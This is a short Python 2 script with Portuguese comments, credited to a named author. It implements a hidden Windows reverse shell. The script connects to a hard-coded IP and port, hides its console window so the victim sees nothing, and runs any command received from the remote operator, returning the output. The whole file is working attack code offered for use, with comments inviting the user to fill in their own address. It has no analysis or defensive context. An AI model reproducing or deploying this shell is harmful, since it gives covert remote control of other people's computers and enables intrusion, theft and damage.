#!wine /root/.wine/drive_c/Python27/python.exe // location
# -*- coding: utf-8 -*-
import subprocess,socket,win32console,win32gui,os

# Desenvolvido pelo Programador Adriel Freud

ip = '192.168.1.56' # Seu ip externo ou interno
porta = 6000 # sua porta
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, porta))
s.send('\nOla Bem vindo - A sua Simples Shell\n')

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
	
def main():	
	hide()
	while 1:
		data = s.recv(1024)
		if data[:-1] == "/exit":
			break
		poss = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = poss.stdout.read() + poss.stderr.read()
		if data.startswith('cd'):
			os.chdir(data[3:].replace('\n',''))
			s.send("\nMovido para "+str(os.getcwd()))
			result='\n'
		s.send(stdoutput+'\nShell>> ')

	s.send('adeus')
	s.close()
if __name__ == "__main__":
	main()	